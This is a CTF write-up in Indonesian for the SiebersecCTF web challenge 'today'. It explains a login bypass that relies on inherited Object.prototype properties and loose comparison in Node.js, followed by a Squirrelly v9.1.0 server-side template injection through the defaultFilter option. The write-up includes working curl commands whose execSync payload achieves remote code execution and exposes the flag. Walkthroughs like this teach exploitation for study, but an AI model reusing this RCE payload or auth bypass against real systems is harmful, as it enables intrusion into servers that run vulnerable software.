Writeup: today (Web Challenge - SiebersecCTF)

Tantangan today menyajikan studi kasus menarik tentang bagaimana pertahanan berbasis daftar hitam (blacklist) terhadap celah Prototype Pollution dapat dilewati sepenuhnya menggunakan kelemahan logika dasar dalam penanganan properti bawaan objek (native properties) dan perbandingan longgar (loose comparison) di JavaScript (Node.js).

1. Informasi Tantangan & Source Code

Aplikasi web ini dibangun menggunakan framework Express dengan template engine Squirrelly (v9.1.0) dan library utilitas uni-flatten (v1.7.1).

Struktur file:

.
├── Dockerfile
├── app.js
├── flag.txt
├── package.json
└── views
    └── index.sqrl


Analisis Autentikasi (app.js):

const users = {
  'admin': crypto.randomBytes(32).toString('hex')
};

app.get("/", (req, res) => {
  const { username, password } = unflatten(req.query);

  if (users[username] === undefined || users[username] != password) {
    return res.status(500).json({ 'error': 'Invalid credentials' });
  }

  return res.render('index', req.query);
});


2. Analisis Kerentanan (Vulnerability Analysis)

Secara teori, tantangan ini dirancang untuk dieksploitasi menggunakan Prototype Pollution melalui library uni-flatten untuk mencemari objek global dan menginjeksi properti defaultFilter ke dalam engine Squirrelly.

Namun, pembuat tantangan mengonfigurasi filter ketat di dalam file deep-set.js milik uni-flatten yang mendeteksi dan langsung memblokir kata kunci __proto__ dan constructor.

Kerentanan 1: Pewarisan Properti Objek & Loose Comparison

Kelemahan fatal terletak pada cara aplikasi memvalidasi kredensial pengguna:

if (users[username] === undefined || users[username] != password)


Pewarisan Objek: users diinisialisasi sebagai objek literal biasa ({}). Oleh karena itu, objek ini secara otomatis mewarisi semua properti dan metode bawaan dari Object.prototype, seperti toString, valueOf, hasOwnProperty, dll.

Akses Properti: Jika kita menyuplai username=toString, maka users['toString'] tidak akan menghasilkan undefined. Ekspresi tersebut akan mengevaluasi metode bawaan objek:

users['toString'] === [Function: toString]


Loose Inequality Bypass: Kondisi kedua membandingkan fungsi tersebut dengan input string password kita menggunakan operator != (perbandingan longgar/tidak ketat).
Di JavaScript, ketika sebuah fungsi dibandingkan dengan string menggunakan operator perbandingan longgar, JavaScript akan secara otomatis memanggil metode .toString() pada objek fungsi tersebut sebelum melakukan perbandingan.
Representasi string dari fungsi asli toString di Node.js adalah:

"function toString() { [native code] }"


Dengan mengirimkan:

username = toString

password = function toString() { [native code] }

Maka evaluasi kondisinya menjadi:

users['toString'] != "function toString() { [native code] }"
// Menjadi:
"function toString() { [native code] }" != "function toString() { [native code] }"
// Hasilnya: false!


Karena kondisi if bernilai false, pemeriksaan login berhasil dilewati sepenuhnya tanpa perlu memecahkan Prototype Pollution!

3. Kerentanan 2: Server-Side Template Injection (SSTI) di Squirrelly

Setelah login berhasil dilewati, seluruh objek req.query dikirimkan secara mentah sebagai parameter opsi ke fungsi render Express:

return res.render('index', req.query);


Squirrelly v9.1.0 mengompilasi template HTML secara dinamis dan rentan terhadap injeksi kode melalui opsi render defaultFilter. Ketika Squirrelly mendeteksi adanya opsi defaultFilter, ia akan menggabungkan nilainya langsung ke dalam tubuh fungsi kompilasi JavaScript yang dihasilkan tanpa melakukan sanitasi string.

Dengan menyuplai parameter defaultFilter langsung di dalam query string, kita dapat mengeksekusi perintah sistem operasi (RCE) dengan menggunakan modul child_process.

4. Alur Eksploitasi (Exploit Walkthrough)

Karena Express memuat ulang template dari disk pada setiap request di lingkungan non-produksi (NODE_ENV !== 'production'), kita dapat menyuntikkan perintah RCE untuk menyalin isi flag asli /app/flag.txt ke dalam file template yang digunakan oleh aplikasi (views/index.sqrl).

Langkah 1: Memicu Eksekusi RCE

Kita mengirimkan request pertama untuk melewati login via bypass toString sekaligus mengirimkan payload defaultFilter untuk menimpa file index.sqrl dengan isi flag.txt:

curl -G "[http://47039f4b-8ee8-4524-9470-3d51c2fde3d3.chal.sieberr.live:8080/](http://47039f4b-8ee8-4524-9470-3d51c2fde3d3.chal.sieberr.live:8080/)" \
  --data-urlencode "username=toString" \
  --data-urlencode "password=function toString() { [native code] }" \
  --data-urlencode "defaultFilter=e'));global.process.mainModule.require('child_process').execSync('cat flag.txt > views/index.sqrl')//"


Pada tahap ini, fungsi execSync berjalan di sisi server dan mengubah isi file views/index.sqrl dari Hello {{ it.username }} menjadi isi dari file flag asli.

Langkah 2: Membaca Output Flag

Kita mengirimkan request kedua dengan payload yang persis sama. Kali ini, saat server merender template index.sqrl, file template yang dimuat ke memori sudah merupakan isi flag yang asli, sehingga flag langsung tercetak di layar:

curl -G "[http://47039f4b-8ee8-4524-9470-3d51c2fde3d3.chal.sieberr.live:8080/](http://47039f4b-8ee8-4524-9470-3d51c2fde3d3.chal.sieberr.live:8080/)" \
  --data-urlencode "username=toString" \
  --data-urlencode "password=function toString() { [native code] }" \
  --data-urlencode "defaultFilter=e'));global.process.mainModule.require('child_process').execSync('cat flag.txt > views/index.sqrl')//"


Output Flag:

sctf{wh4t_c0m3s_Aft3R_t0d4y???THr33d4y!!!}
